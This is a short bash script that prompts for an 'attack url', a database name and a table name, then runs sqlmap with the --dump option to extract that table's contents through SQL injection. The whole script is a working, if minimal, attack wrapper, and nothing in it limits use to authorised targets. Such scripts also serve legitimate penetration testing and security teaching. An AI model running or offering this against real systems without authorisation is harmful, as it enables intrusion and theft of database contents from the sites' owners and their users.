#!/bin/bash

echo "Enter the attack url (include GET parameters to check for SQL injection)"
read url
echo "Enter the databse name you want to find tables in"
read dbname
echo "Enter the table name in the database you want to find the columns for"
read tableName

sudo sqlmap -u $url --dump -D $dbname -T $tableName
